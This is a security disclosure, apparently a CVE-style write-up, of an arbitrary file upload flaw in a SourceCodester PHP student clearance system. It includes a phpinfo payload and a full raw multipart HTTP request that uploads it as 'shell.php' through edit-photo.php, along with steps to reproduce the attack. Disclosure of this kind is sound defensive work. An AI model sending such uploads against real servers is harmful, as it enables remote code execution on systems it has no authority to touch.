## Vulnerability Description

Arbitrary file upload vulnerability in SourceCodester [Web-Based Student Clearance System in PHP Free Source Code v1.0](https://www.sourcecodester.com/php/15627/web-based-student-clearance-system.html) allows attackers to execute arbitrary code via the file upload to edit-photo.php. It is an open source project from [https://www.sourcecodester.com/](https://www.sourcecodester.com/).

1. BUG_Author: Tr0e
  
2. vendors: [Web-Based Student Clearance System in PHP Free Source Code](https://www.sourcecodester.com/php/15627/web-based-student-clearance-system.html);
  
3. The program is built using the xmapp/v3.3.0 and PHP/8.1.10 version;
  
4. Vulnerability location: /student_clearance_system_Aurthur_Javis/edit-photo.php
  

# Vulnerability Verification

[+] Payload:

```php
<?php phpinfo();?>
```

POC：

```js
POST http://192.168.0.111:91/student_clearance_system_Aurthur_Javis/edit-photo.php HTTP/1.1
Host: 192.168.0.111:91
Content-Length: 311
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.111:91
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytjK6voHXrTiN8PsK
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.0.111:91/student_clearance_system_Aurthur_Javis/edit-photo.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=e8pdd3dv0b39d1h4vcj99q01cq
Connection: close

------WebKitFormBoundarytjK6voHXrTiN8PsK
Content-Disposition: form-data; name="userImage"; filename="shell.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundarytjK6voHXrTiN8PsK
Content-Disposition: form-data; name="btnedit"


------WebKitFormBoundarytjK6voHXrTiN8PsK--
```

## How to verify

Build the vulnerability environment according to the steps provided by the source code author (First log in to the background management system through the default account password, then create a student user and obtain the login password) and execute the Payload provided above.

The vulnerability lies in the "Account - Edit Photo " function, you shuold inserts Payload when you update photo，as shown in the following figure：
![image](https://user-images.githubusercontent.com/42080954/194352089-7cba511a-a763-4a77-86a8-04d96f036a25.png)
![image](https://user-images.githubusercontent.com/42080954/194353581-dac75c75-9e9e-4f8b-a272-3791a9a2fe86.png)
![image](https://user-images.githubusercontent.com/42080954/194353855-2775478f-c7ef-49ad-9756-af7742a6c7b9.png)


